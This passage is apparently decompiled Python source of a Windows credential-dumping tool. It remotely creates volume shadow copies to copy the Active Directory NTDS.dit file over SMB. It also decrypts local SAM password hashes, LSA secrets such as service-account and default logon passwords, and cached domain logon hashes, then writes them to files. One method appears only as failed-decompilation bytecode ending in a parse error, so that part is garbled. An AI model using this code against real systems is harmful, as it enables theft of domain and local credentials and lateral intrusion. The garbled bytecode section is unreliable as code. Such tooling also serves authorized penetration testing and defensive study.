            self.__mmcExec(command)
        else:
            raise Exception('Invalid exec method %s, aborting' % self.__execMethod)

    def __answer(self, data):
        self.__answerTMP += data

    def __getLastVSS(self):
        self.__executeRemote('%COMSPEC% /C vssadmin list shadows')
        time.sleep(5)
        tries = 0
        while True:
            try:
                self.__smbConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                break
            except Exception as e:
                if tries > 30:
                    raise Exception('Too many tries trying to list vss shadows')
                if str(e).find('SHARING') > 0:
                    time.sleep(5)
                    tries += 1
                else:
                    raise

        lines = self.__answerTMP.split('\n')
        lastShadow = ''
        lastShadowFor = ''
        SHADOWFOR = 'Volume: ('
        for line in lines:
            if line.find('GLOBALROOT') > 0:
                lastShadow = line[line.find('\\\\?'):][:-1]
            elif line.find(SHADOWFOR) > 0:
                lastShadowFor = line[line.find(SHADOWFOR) + len(SHADOWFOR):][:2]

        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
        return (
         lastShadow, lastShadowFor)

    def saveNTDS(self):
        LOG.info('Searching for NTDS.dit')
        ans = rrp.hOpenLocalMachine(self.__rrp)
        regHandle = ans['phKey']
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters')
            keyHandle = ans['phkResult']
        except:
            return

        try:
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DSA Database file')
            ntdsLocation = dataValue[:-1]
            ntdsDrive = ntdsLocation[:2]
        except:
            return

        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        rrp.hBaseRegCloseKey(self.__rrp, regHandle)
        LOG.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % ntdsLocation)
        LOG.info('Using %s method for remote execution' % self.__execMethod)
        shadow, shadowFor = self.__getLastVSS()
        if shadow == '' or shadow != '' and shadowFor != ntdsDrive:
            self.__executeRemote('%%COMSPEC%% /C vssadmin create shadow /For=%s' % ntdsDrive)
            shadow, shadowFor = self.__getLastVSS()
            shouldRemove = True
            if shadow == '':
                raise Exception('Could not get a VSS')
        else:
            shouldRemove = False
        tmpFileName = ('').join([ random.choice(string.letters) for _ in range(8) ]) + '.tmp'
        self.__executeRemote('%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%s' % (shadow, ntdsLocation[2:], tmpFileName))
        if shouldRemove is True:
            self.__executeRemote('%%COMSPEC%% /C vssadmin delete shadows /For=%s /Quiet' % ntdsDrive)
        tries = 0
        while True:
            try:
                self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
                break
            except Exception as e:
                if tries >= 30:
                    raise e
                if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0 or str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    tries += 1
                    time.sleep(5)
                else:
                    logging.error('Cannot delete target file \\\\%s\\ADMIN$\\Temp\\__output: %s' % (self.__smbConnection.getRemoteHost(), str(e)))

        remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)
        return remoteFileName


class CryptoCommon():

    def transformKey(self, InputKey):
        OutputKey = []
        OutputKey.append(chr(ord(InputKey[0]) >> 1))
        OutputKey.append(chr((ord(InputKey[0]) & 1) << 6 | ord(InputKey[1]) >> 2))
        OutputKey.append(chr((ord(InputKey[1]) & 3) << 5 | ord(InputKey[2]) >> 3))
        OutputKey.append(chr((ord(InputKey[2]) & 7) << 4 | ord(InputKey[3]) >> 4))
        OutputKey.append(chr((ord(InputKey[3]) & 15) << 3 | ord(InputKey[4]) >> 5))
        OutputKey.append(chr((ord(InputKey[4]) & 31) << 2 | ord(InputKey[5]) >> 6))
        OutputKey.append(chr((ord(InputKey[5]) & 63) << 1 | ord(InputKey[6]) >> 7))
        OutputKey.append(chr(ord(InputKey[6]) & 127))
        for i in range(8):
            OutputKey[i] = chr(ord(OutputKey[i]) << 1 & 254)

        return ('').join(OutputKey)

    def deriveKey(self, baseKey):
        key = pack('<L', baseKey)
        key1 = key[0] + key[1] + key[2] + key[3] + key[0] + key[1] + key[2]
        key2 = key[3] + key[0] + key[1] + key[2] + key[3] + key[0] + key[1]
        return (self.transformKey(key1), self.transformKey(key2))

    @staticmethod
    def decryptAES(key, value, iv='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'):
        plainText = ''
        if iv != '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00':
            aes256 = AES.new(key, AES.MODE_CBC, iv)
        for index in range(0, len(value), 16):
            if iv == '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00':
                aes256 = AES.new(key, AES.MODE_CBC, iv)
            cipherBuffer = value[index:index + 16]
            if len(cipherBuffer) < 16:
                cipherBuffer += '\x00' * (16 - len(cipherBuffer))
            plainText += aes256.decrypt(cipherBuffer)

        return plainText


class OfflineRegistry():

    def __init__(self, hiveFile=None, isRemote=False):
        self.__hiveFile = hiveFile
        if self.__hiveFile is not None:
            self.__registryHive = winregistry.Registry(self.__hiveFile, isRemote)
        return

    def enumKey(self, searchKey):
        parentKey = self.__registryHive.findKey(searchKey)
        if parentKey is None:
            return
        else:
            keys = self.__registryHive.enumKey(parentKey)
            return keys

    def enumValues(self, searchKey):
        key = self.__registryHive.findKey(searchKey)
        if key is None:
            return
        else:
            values = self.__registryHive.enumValues(key)
            return values

    def getValue(self, keyValue):
        value = self.__registryHive.getValue(keyValue)
        if value is None:
            return
        else:
            return value

    def getClass(self, className):
        value = self.__registryHive.getClass(className)
        if value is None:
            return
        else:
            return value

    def finish(self):
        if self.__hiveFile is not None:
            self.__registryHive.close()
        return


class SAMHashes(OfflineRegistry):

    def __init__(self, samFile, bootKey, isRemote=False, perSecretCallback=lambda secret: _print_helper(secret)):
        OfflineRegistry.__init__(self, samFile, isRemote)
        self.__samFile = samFile
        self.__hashedBootKey = ''
        self.__bootKey = bootKey
        self.__cryptoCommon = CryptoCommon()
        self.__itemsFound = {}
        self.__perSecretCallback = perSecretCallback

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def getHBootKey(self):
        LOG.debug('Calculating HashedBootKey from SAM')
        QWERTY = '!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00'
        DIGITS = '0123456789012345678901234567890123456789\x00'
        F = self.getValue(ntpath.join('SAM\\Domains\\Account', 'F'))[1]
        domainData = DOMAIN_ACCOUNT_F(F)
        if domainData['Key0'][0] == '\x01':
            samKeyData = SAM_KEY_DATA(domainData['Key0'])
            rc4Key = self.MD5(samKeyData['Salt'] + QWERTY + self.__bootKey + DIGITS)
            rc4 = ARC4.new(rc4Key)
            self.__hashedBootKey = rc4.encrypt(samKeyData['Key'] + samKeyData['CheckSum'])
            checkSum = self.MD5(self.__hashedBootKey[:16] + DIGITS + self.__hashedBootKey[:16] + QWERTY)
            if checkSum != self.__hashedBootKey[16:]:
                raise Exception('hashedBootKey CheckSum failed, Syskey startup password probably in use! :(')
        elif domainData['Key0'][0] == '\x02':
            samKeyData = SAM_KEY_DATA_AES(domainData['Key0'])
            self.__hashedBootKey = self.__cryptoCommon.decryptAES(self.__bootKey, samKeyData['Data'][:samKeyData['DataLen']], samKeyData['Salt'])

    def __decryptHash(self, rid, cryptedHash, constant, newStyle=False):
        Key1, Key2 = self.__cryptoCommon.deriveKey(rid)
        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)
        if newStyle is False:
            rc4Key = self.MD5(self.__hashedBootKey[:16] + pack('<L', rid) + constant)
            rc4 = ARC4.new(rc4Key)
            key = rc4.encrypt(cryptedHash['Hash'])
        else:
            key = self.__cryptoCommon.decryptAES(self.__hashedBootKey[:16], cryptedHash['Hash'], cryptedHash['Salt'])[:16]
        decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])
        return decryptedHash

    def dump(self):
        NTPASSWORD = 'NTPASSWORD\x00'
        LMPASSWORD = 'LMPASSWORD\x00'
        if self.__samFile is None:
            return
        else:
            LOG.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
            self.getHBootKey()
            usersKey = 'SAM\\Domains\\Account\\Users'
            rids = self.enumKey(usersKey)
            try:
                rids.remove('Names')
            except:
                pass

            for rid in rids:
                userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey, rid, 'V'))[1])
                rid = int(rid, 16)
                V = userAccount['Data']
                userName = V[userAccount['NameOffset']:userAccount['NameOffset'] + userAccount['NameLength']].decode('utf-16le')
                if V[userAccount['NTHashOffset']:][2] == '\x01':
                    newStyle = False
                    if userAccount['LMHashLength'] == 20:
                        encLMHash = SAM_HASH(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
                    if userAccount['NTHashLength'] == 20:
                        encNTHash = SAM_HASH(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])
                else:
                    newStyle = True
                    if userAccount['LMHashLength'] == 24:
                        encLMHash = SAM_HASH_AES(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
                    encNTHash = SAM_HASH_AES(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])
                LOG.debug('NewStyle hashes is: %s' % newStyle)
                if userAccount['LMHashLength'] >= 20:
                    lmHash = self.__decryptHash(rid, encLMHash, LMPASSWORD, newStyle)
                else:
                    lmHash = ''
                ntHash = self.__decryptHash(rid, encNTHash, NTPASSWORD, newStyle)
                if lmHash == '':
                    lmHash = ntlm.LMOWFv1('', '')
                if ntHash == '':
                    ntHash = ntlm.NTOWFv1('', '')
                answer = '%s:%d:%s:%s:::' % (userName, rid, hexlify(lmHash), hexlify(ntHash))
                self.__itemsFound[rid] = answer
                self.__perSecretCallback(answer)

            return

    def export(self, fileName):
        if len(self.__itemsFound) > 0:
            items = sorted(self.__itemsFound)
            fd = codecs.open(fileName + '.sam', 'w+', encoding='utf-8')
            for item in items:
                fd.write(self.__itemsFound[item] + '\n')

            fd.close()


class LSASecrets(OfflineRegistry):
    UNKNOWN_USER = '(Unknown User)'

    class SECRET_TYPE:
        LSA = 0
        LSA_HASHED = 1
        LSA_RAW = 2

    def __init__(self, securityFile, bootKey, remoteOps=None, isRemote=False, history=False, perSecretCallback=lambda secretType, secret: _print_helper(secret)):
        OfflineRegistry.__init__(self, securityFile, isRemote)
        self.__hashedBootKey = ''
        self.__bootKey = bootKey
        self.__LSAKey = ''
        self.__NKLMKey = ''
        self.__vistaStyle = True
        self.__cryptoCommon = CryptoCommon()
        self.__securityFile = securityFile
        self.__remoteOps = remoteOps
        self.__cachedItems = []
        self.__secretItems = []
        self.__perSecretCallback = perSecretCallback
        self.__history = history

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def __sha256(self, key, value, rounds=1000):
        sha = hashlib.sha256()
        sha.update(key)
        for i in range(1000):
            sha.update(value)

        return sha.digest()

    def __decryptSecret(self, key, value):
        plainText = ''
        encryptedSecretSize = unpack('<I', value[:4])[0]
        value = value[len(value) - encryptedSecretSize:]
        key0 = key
        for i in range(0, len(value), 8):
            cipherText = value[:8]
            tmpStrKey = key0[:7]
            tmpKey = self.__cryptoCommon.transformKey(tmpStrKey)
            Crypt1 = DES.new(tmpKey, DES.MODE_ECB)
            plainText += Crypt1.decrypt(cipherText)
            key0 = key0[7:]
            value = value[8:]
            if len(key0) < 7:
                key0 = key[len(key0):]

        secret = LSA_SECRET_XP(plainText)
        return secret['Secret']

    def __decryptHash(self, key, value, iv):
        hmac_md5 = HMAC.new(key, iv)
        rc4key = hmac_md5.digest()
        rc4 = ARC4.new(rc4key)
        data = rc4.encrypt(value)
        return data

    def __decryptLSA(self, value):
        if self.__vistaStyle is True:
            record = LSA_SECRET(value)
            tmpKey = self.__sha256(self.__bootKey, record['EncryptedData'][:32])
            plainText = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
            record = LSA_SECRET_BLOB(plainText)
            self.__LSAKey = record['Secret'][52:][:32]
        else:
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)
            for i in range(1000):
                md5.update(value[60:76])

            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            plainText = rc4.decrypt(value[12:60])
            self.__LSAKey = plainText[16:32]

    def __getLSASecretKey(self):
        LOG.debug('Decrypting LSA Key')
        value = self.getValue('\\Policy\\PolEKList\\default')
        if value is None:
            LOG.debug('PolEKList not found, trying PolSecretEncryptionKey')
            value = self.getValue('\\Policy\\PolSecretEncryptionKey\\default')
            self.__vistaStyle = False
            if value is None:
                return
        self.__decryptLSA(value[1])
        return

    def __getNLKMSecret(self):
        LOG.debug('Decrypting NL$KM')
        value = self.getValue('\\Policy\\Secrets\\NL$KM\\CurrVal\\default')
        if value is None:
            raise Exception("Couldn't get NL$KM value")
        if self.__vistaStyle is True:
            record = LSA_SECRET(value[1])
            tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
            self.__NKLMKey = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
        else:
            self.__NKLMKey = self.__decryptSecret(self.__LSAKey, value[1])
        return

    def __pad(self, data):
        if data & 3 > 0:
            return data + (data & 3)
        else:
            return data

    def dumpCachedHashes--- This code section failed: ---

 L.1357         0  LOAD_FAST             0  'self'
                3  LOAD_ATTR             0  '__securityFile'
                6  LOAD_CONST               None
                9  COMPARE_OP            8  is
               12  POP_JUMP_IF_FALSE    19  'to 19'

 L.1359        15  LOAD_CONST               None
               18  RETURN_END_IF    
             19_0  COME_FROM            12  '12'

 L.1361        19  LOAD_GLOBAL           2  'LOG'
               22  LOAD_ATTR             3  'info'
               25  LOAD_CONST               'Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)'
               28  CALL_FUNCTION_1       1  None
               31  POP_TOP          

 L.1364        32  LOAD_FAST             0  'self'
               35  LOAD_ATTR             4  'enumValues'
               38  LOAD_CONST               '\\Cache'
               41  CALL_FUNCTION_1       1  None
               44  STORE_FAST            1  'values'

 L.1365        47  LOAD_FAST             1  'values'
               50  LOAD_CONST               None
               53  COMPARE_OP            8  is
               56  POP_JUMP_IF_FALSE    63  'to 63'

 L.1367        59  LOAD_CONST               None
               62  RETURN_END_IF    
             63_0  COME_FROM            56  '56'

 L.1368        63  SETUP_EXCEPT         17  'to 83'

 L.1370        66  LOAD_FAST             1  'values'
               69  LOAD_ATTR             5  'remove'
               72  LOAD_CONST               'NL$Control'
               75  CALL_FUNCTION_1       1  None
               78  POP_TOP          
               79  POP_BLOCK        
               80  JUMP_FORWARD          7  'to 90'
             83_0  COME_FROM            63  '63'

 L.1371        83  POP_TOP          
               84  POP_TOP          
               85  POP_TOP          

 L.1372        86  JUMP_FORWARD          1  'to 90'
               89  END_FINALLY      
             90_0  COME_FROM            89  '89'
             90_1  COME_FROM            80  '80'

 L.1374        90  LOAD_FAST             0  'self'
               93  LOAD_ATTR             6  '__getLSASecretKey'
               96  CALL_FUNCTION_0       0  None
               99  POP_TOP          

 L.1375       100  LOAD_FAST             0  'self'
              103  LOAD_ATTR             7  '__getNLKMSecret'
              106  CALL_FUNCTION_0       0  None
              109  POP_TOP          

 L.1377       110  SETUP_LOOP          415  'to 528'
              113  LOAD_FAST             1  'values'
              116  GET_ITER         
              117  FOR_ITER            407  'to 527'
              120  STORE_FAST            2  'value'

 L.1378       123  LOAD_GLOBAL           2  'LOG'
              126  LOAD_ATTR             8  'debug'
              129  LOAD_CONST               'Looking into %s'
              132  LOAD_FAST             2  'value'
              135  BINARY_MODULO    
              136  CALL_FUNCTION_1       1  None
              139  POP_TOP          

 L.1379       140  LOAD_GLOBAL           9  'NL_RECORD'
              143  LOAD_FAST             0  'self'
              146  LOAD_ATTR            10  'getValue'
              149  LOAD_GLOBAL          11  'ntpath'
              152  LOAD_ATTR            12  'join'
              155  LOAD_CONST               '\\Cache'
              158  LOAD_FAST             2  'value'
              161  CALL_FUNCTION_2       2  None
              164  CALL_FUNCTION_1       1  None
              167  LOAD_CONST               1
              170  BINARY_SUBSCR    
              171  CALL_FUNCTION_1       1  None
              174  STORE_FAST            3  'record'

 L.1380       177  LOAD_FAST             3  'record'
              180  LOAD_CONST               'IV'
              183  BINARY_SUBSCR    
              184  LOAD_CONST               '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
              187  COMPARE_OP            3  !=
              190  POP_JUMP_IF_FALSE   117  'to 117'

 L.1382       193  LOAD_FAST             3  'record'
              196  LOAD_CONST               'Flags'
              199  BINARY_SUBSCR    
              200  LOAD_CONST               1
              203  BINARY_AND       
              204  LOAD_CONST               1
              207  COMPARE_OP            2  ==
            210_0  COME_FROM           190  '190'
              210  POP_JUMP_IF_FALSE   117  'to 117'

 L.1384       213  LOAD_FAST             0  'self'
              216  LOAD_ATTR            13  '__vistaStyle'
              219  LOAD_GLOBAL          14  'True'
              222  COMPARE_OP            8  is
              225  POP_JUMP_IF_FALSE   273  'to 273'

 L.1385       228  LOAD_FAST             0  'self'
              231  LOAD_ATTR            15  '__cryptoCommon'
              234  LOAD_ATTR            16  'decryptAES'
              237  LOAD_FAST             0  'self'
              240  LOAD_ATTR            17  '__NKLMKey'
              243  LOAD_CONST               16
              246  LOAD_CONST               32
              249  SLICE+3          
              250  LOAD_FAST             3  'record'
              253  LOAD_CONST               'EncryptedData'
              256  BINARY_SUBSCR    
              257  LOAD_FAST             3  'record'
              260  LOAD_CONST               'IV'
              263  BINARY_SUBSCR    
              264  CALL_FUNCTION_3       3  None
              267  STORE_FAST            4  'plainText'
              270  JUMP_ABSOLUTE       311  'to 311'

 L.1387       273  LOAD_FAST             0  'self'
              276  LOAD_ATTR            18  '__decryptHash'
              279  LOAD_FAST             0  'self'
              282  LOAD_ATTR            17  '__NKLMKey'
              285  LOAD_FAST             3  'record'
              288  LOAD_CONST               'EncryptedData'
              291  BINARY_SUBSCR    
              292  LOAD_FAST             3  'record'
              295  LOAD_CONST               'IV'
              298  BINARY_SUBSCR    
              299  CALL_FUNCTION_3       3  None
              302  STORE_FAST            4  'plainText'

 L.1388       305  JUMP_FORWARD          3  'to 311'

 L.1392       308  CONTINUE            117  'to 117'
            311_0  COME_FROM           305  '305'

 L.1393       311  LOAD_FAST             4  'plainText'
              314  LOAD_CONST               16
              317  SLICE+2          
              318  STORE_FAST            5  'encHash'

 L.1394       321  LOAD_FAST             4  'plainText'
              324  LOAD_CONST               72
              327  SLICE+1          
              328  STORE_FAST            4  'plainText'

 L.1395       331  LOAD_FAST             4  'plainText'
              334  LOAD_FAST             3  'record'
              337  LOAD_CONST               'UserLength'
              340  BINARY_SUBSCR    
              341  SLICE+2          
              342  LOAD_ATTR            19  'decode'
              345  LOAD_CONST               'utf-16le'
              348  CALL_FUNCTION_1       1  None
              351  STORE_FAST            6  'userName'

 L.1396       354  LOAD_FAST             4  'plainText'
              357  LOAD_FAST             0  'self'
              360  LOAD_ATTR            20  '__pad'
              363  LOAD_FAST             3  'record'
              366  LOAD_CONST               'UserLength'
              369  BINARY_SUBSCR    
              370  CALL_FUNCTION_1       1  None
              373  SLICE+1          
              374  STORE_FAST            4  'plainText'

 L.1397       377  LOAD_FAST             4  'plainText'
              380  LOAD_FAST             3  'record'
              383  LOAD_CONST               'DomainNameLength'
              386  BINARY_SUBSCR    
              387  SLICE+2          
              388  LOAD_ATTR            19  'decode'
              391  LOAD_CONST               'utf-16le'
              394  CALL_FUNCTION_1       1  None
              397  STORE_FAST            7  'domain'

 L.1398       400  LOAD_FAST             4  'plainText'
              403  LOAD_FAST             0  'self'
              406  LOAD_ATTR            20  '__pad'
              409  LOAD_FAST             3  'record'
              412  LOAD_CONST               'DomainNameLength'
              415  BINARY_SUBSCR    
              416  CALL_FUNCTION_1       1  None
              419  SLICE+1          
              420  STORE_FAST            4  'plainText'

 L.1399       423  LOAD_FAST             4  'plainText'
              426  LOAD_FAST             0  'self'
              429  LOAD_ATTR            20  '__pad'
              432  LOAD_FAST             3  'record'
              435  LOAD_CONST               'DnsDomainNameLength'
              438  BINARY_SUBSCR    
              439  CALL_FUNCTION_1       1  None
              442  SLICE+2          
              443  LOAD_ATTR            19  'decode'
              446  LOAD_CONST               'utf-16le'
              449  CALL_FUNCTION_1       1  None
              452  STORE_FAST            8  'domainLong'

 L.1400       455  LOAD_CONST               '%s:%s:%s:%s:::'
              458  LOAD_FAST             6  'userName'
              461  LOAD_GLOBAL          21  'hexlify'
              464  LOAD_FAST             5  'encHash'
              467  CALL_FUNCTION_1       1  None
              470  LOAD_FAST             8  'domainLong'
              473  LOAD_FAST             7  'domain'
              476  BUILD_TUPLE_4         4 
              479  BINARY_MODULO    
              480  STORE_FAST            9  'answer'

 L.1401       483  LOAD_FAST             0  'self'
              486  LOAD_ATTR            22  '__cachedItems'
              489  LOAD_ATTR            23  'append'
              492  LOAD_FAST             9  'answer'
              495  CALL_FUNCTION_1       1  None
              498  POP_TOP          

 L.1402       499  LOAD_FAST             0  'self'
              502  LOAD_ATTR            24  '__perSecretCallback'
              505  LOAD_GLOBAL          25  'LSASecrets'
              508  LOAD_ATTR            26  'SECRET_TYPE'
              511  LOAD_ATTR            27  'LSA_HASHED'
              514  LOAD_FAST             9  'answer'
              517  CALL_FUNCTION_2       2  None
              520  POP_TOP          
              521  JUMP_BACK           117  'to 117'
              524  JUMP_BACK           117  'to 117'
              527  POP_BLOCK        
            528_0  COME_FROM           110  '110'
              528  LOAD_CONST               None
              531  RETURN_VALUE     

Parse error at or near `JUMP_BACK' instruction at offset 524

    def __printSecret(self, name, secretItem):
        if len(secretItem) == 0:
            LOG.debug('Discarding secret %s, NULL Data' % name)
            return
        else:
            if secretItem.startswith('\x00\x00'):
                LOG.debug('Discarding secret %s, all zeros' % name)
                return
            upperName = name.upper()
            LOG.info('%s ' % name)
            secret = ''
            if upperName.startswith('_SC_'):
                try:
                    strDecoded = secretItem.decode('utf-16le')
                except:
                    pass
                else:
                    if hasattr(self.__remoteOps, 'getServiceAccount'):
                        account = self.__remoteOps.getServiceAccount(name[4:])
                        if account is None:
                            secret = self.UNKNOWN_USER + ':'
                        else:
                            secret = '%s:' % account
                    else:
                        secret = self.UNKNOWN_USER + ':'
                    secret += strDecoded

            elif upperName.startswith('DEFAULTPASSWORD'):
                try:
                    strDecoded = secretItem.decode('utf-16le')
                except:
                    pass
                else:
                    if hasattr(self.__remoteOps, 'getDefaultLoginAccount'):
                        account = self.__remoteOps.getDefaultLoginAccount()
                        if account is None:
                            secret = self.UNKNOWN_USER + ':'
                        else:
                            secret = '%s:' % account
                    else:
                        secret = self.UNKNOWN_USER + ':'
                    secret += strDecoded

            elif upperName.startswith('ASPNET_WP_PASSWORD'):
                try:
                    strDecoded = secretItem.decode('utf-16le')
                except:
                    pass
                else:
                    secret = 'ASPNET: %s' % strDecoded

            elif upperName.startswith('$MACHINE.ACC'):
                md4 = MD4.new()
                md4.update(secretItem)
                if hasattr(self.__remoteOps, 'getMachineNameAndDomain'):
                    machine, domain = self.__remoteOps.getMachineNameAndDomain()
                    secret = '%s\\%s$:%s:%s:::' % (domain, machine, hexlify(ntlm.LMOWFv1('', '')), hexlify(md4.digest()))
                else:
                    secret = '$MACHINE.ACC: %s:%s' % (hexlify(ntlm.LMOWFv1('', '')), hexlify(md4.digest()))
            if secret != '':
                printableSecret = secret
                self.__secretItems.append(secret)
                self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA, printableSecret)
            else:
                printableSecret = '%s:%s' % (name, hexlify(secretItem))
                self.__secretItems.append(printableSecret)
                if self.__module__ == self.__perSecretCallback.__module__:
                    hexdump(secretItem)
                self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA_RAW, printableSecret)
            return

    def dumpSecrets(self):
        if self.__securityFile is None:
            return
        else:
            LOG.info('Dumping LSA Secrets')
            keys = self.enumKey('\\Policy\\Secrets')
            if keys is None:
                return
            try:
                keys.remove('NL$Control')
            except:
                pass

            if self.__LSAKey == '':
                self.__getLSASecretKey()
            for key in keys:
                LOG.debug('Looking into %s' % key)
                valueTypeList = ['CurrVal']
                if self.__history:
                    valueTypeList.append('OldVal')
                for valueType in valueTypeList:
                    value = self.getValue(('\\Policy\\Secrets\\{}\\{}\\default').format(key, valueType))
                    if value is not None and value[1] != 0:
                        if self.__vistaStyle is True:
                            record = LSA_SECRET(value[1])
                            tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
                            plainText = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
                            record = LSA_SECRET_BLOB(plainText)
                            secret = record['Secret']
                        else:
                            secret = self.__decryptSecret(self.__LSAKey, value[1])
                        if valueType == 'OldVal':
                            key += '_history'
                        self.__printSecret(key, secret)

            return

    def exportSecrets(self, fileName):
        if len(self.__secretItems) > 0:
            fd = codecs.open(fileName + '.secrets', 'w+', encoding='utf-8')
            for item in self.__secretItems:
                fd.write(item + '\n')

            fd.close()

    def exportCached(self, fileName):
        if len(self.__cachedItems) > 0:
            fd = codecs.open(fileName + '.cached', 'w+', encoding='utf-8')
            for item in self.__cachedItems:
                fd.write(item + '\n')

            fd.close()


class ResumeSessionMgrInFile(object):

    def __init__(self, resumeFileName=None):
        self.__resumeFileName = resumeFileName
        self.__resumeFile = None
        self.__hasResumeData = resumeFileName is not None
        return

    def hasResumeData(self):
        return self.__hasResumeData

    def clearResumeData(self):
        self.endTransaction()
        if self.__resumeFileName and os.path.isfile(self.__resumeFileName):
            os.remove(self.__resumeFileName)

    def writeResumeData(self, data):
        self.__resumeFile.seek(0, 0)
        self.__resumeFile.truncate(0)
        self.__resumeFile.write(data)
        self.__resumeFile.flush()

    def getResumeData(self):
        try:
            self.__resumeFile = open(self.__resumeFileName, 'rb')
        except Exception as e:
            raise Exception('Cannot open resume session file name %s' % str(e))

        resumeSid = self.__resumeFile.read()
        self.__resumeFile.close()
        self.__resumeFile = open(self.__resumeFileName, 'wb+')
        return resumeSid

    def getFileName(self):
        return self.__resumeFileName

    def beginTransaction(self):
        if not self.__resumeFileName:
            self.__resumeFileName = 'sessionresume_%s' % ('').join(random.choice(string.letters) for _ in range(8))
            LOG.debug('Session resume file will be %s' % self.__resumeFileName)
        if not self.__resumeFile:
            try:
                self.__resumeFile = open(self.__resumeFileName, 'wb+')
            except Exception as e:
                raise Exception('Cannot create "%s" resume session file: %s' % (self.__resumeFileName, str(e)))

    def endTransaction(self):
        if self.__resumeFile:
            self.__resumeFile.close()
            self.__resumeFile = None
        return


class NTDSHashes():

    class SECRET_TYPE():
        NTDS = 0
        NTDS_CLEARTEXT = 1
        NTDS_KERBEROS = 2

    NAME_TO_INTERNAL = {'uSNCreated': 'ATTq131091', 
       'uSNChanged': 'ATTq131192', 
       'name': 'ATTm3', 
       'objectGUID': 'ATTk589826', 
       'objectSid': 'ATTr589970', 
       'userAccountControl': 'ATTj589832', 
       'primaryGroupID': 'ATTj589922', 
       'accountExpires': 'ATTq589983', 
       'logonCount': 'ATTj589993', 
       'sAMAccountName': 'ATTm590045', 
       'sAMAccountType': 'ATTj590126', 
       'lastLogonTimestamp': 'ATTq589876', 
       'userPrincipalName': 'ATTm590480', 
       'unicodePwd': 'ATTk589914', 
       'dBCSPwd': 'ATTk589879', 
       'ntPwdHistory': 'ATTk589918', 
       'lmPwdHistory': 'ATTk589984', 
       'pekList': 'ATTk590689', 
       'supplementalCredentials': 'ATTk589949', 
       'pwdLastSet': 'ATTq589920'}
    NAME_TO_ATTRTYP = {'userPrincipalName': 590480, 
       'sAMAccountName': 590045, 
       'unicodePwd': 589914, 
       'dBCSPwd': 589879, 
       'ntPwdHistory': 589918, 
       'lmPwdHistory': 589984, 
       'supplementalCredentials': 589949, 
       'objectSid': 589970, 
       'userAccountControl': 589832}
    ATTRTYP_TO_ATTID = {'userPrincipalName': '1.2.840.113556.1.4.656', 
       'sAMAccountName': '1.2.840.113556.1.4.221', 
       'unicodePwd': '1.2.840.113556.1.4.90', 
       'dBCSPwd': '1.2.840.113556.1.4.55', 
       'ntPwdHistory': '1.2.840.113556.1.4.94', 
       'lmPwdHistory': '1.2.840.113556.1.4.160', 
       'supplementalCredentials': '1.2.840.113556.1.4.125', 
       'objectSid': '1.2.840.113556.1.4.146', 
       'pwdLastSet': '1.2.840.113556.1.4.96', 
       'userAccountControl': '1.2.840.113556.1.4.8'}
    KERBEROS_TYPE = {1: 'dec-cbc-crc', 
       3: 'des-cbc-md5', 
       17: 'aes128-cts-hmac-sha1-96', 
       18: 'aes256-cts-hmac-sha1-96', 
       4294967156: 'rc4_hmac'}
    INTERNAL_TO_NAME = dict((v, k) for k, v in NAME_TO_INTERNAL.iteritems())
    SAM_NORMAL_USER_ACCOUNT = 805306368
    SAM_MACHINE_ACCOUNT = 805306369
    SAM_TRUST_ACCOUNT = 805306370
    ACCOUNT_TYPES = (
     SAM_NORMAL_USER_ACCOUNT, SAM_MACHINE_ACCOUNT, SAM_TRUST_ACCOUNT)

    class PEKLIST_ENC(Structure):
        structure = (
         ('Header', '8s=""'),
         ('KeyMaterial', '16s=""'),
         ('EncryptedPek', ':'))

    class PEKLIST_PLAIN(Structure):
        structure = (
         ('Header', '32s=""'),
         ('DecryptedPek', ':'))

    class PEK_KEY(Structure):
        structure = (
         ('Header', '1s=""'),
         ('Padding', '3s=""'),
         ('Key', '16s=""'))

    class CRYPTED_HASH(Structure):
        structure = (
         ('Header', '8s=""'),
         ('KeyMaterial', '16s=""'),
         ('EncryptedHash', '16s=""'))

    class CRYPTED_HASHW16(Structure):
        structure = (
         ('Header', '8s=""'),
         ('KeyMaterial', '16s=""'),
